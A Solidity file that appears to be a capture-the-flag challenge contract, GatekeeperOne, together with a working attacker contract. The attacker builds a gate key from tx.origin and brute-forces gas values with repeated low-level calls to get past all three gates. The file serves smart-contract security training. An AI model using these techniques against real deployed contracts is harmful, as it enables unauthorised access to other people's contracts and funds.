// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne private gatekeeper;
    
    // perform the bitwise operation on your bytes8 address
    bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
    uint256 count;

    constructor(address _contractAddress) {
        gatekeeper = GatekeeperOne(_contractAddress);
    }

    function attack() public {
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);

        // the call to the enter function will take up some amount of gas.
        // the second gate requires that the amount of gas left at that point be a multiple of 8191.
        // To make that happen, we increment gas amount until the condition is satisfied.
        for (uint256 i; i < 300; i++) {
            (bool result, ) = address(gatekeeper).call{ gas: i + 150 + 8191 * 4 }(encodedParams);
            
            if(result) {
                break;
            } else {
                count++;
            }
        }
    }
}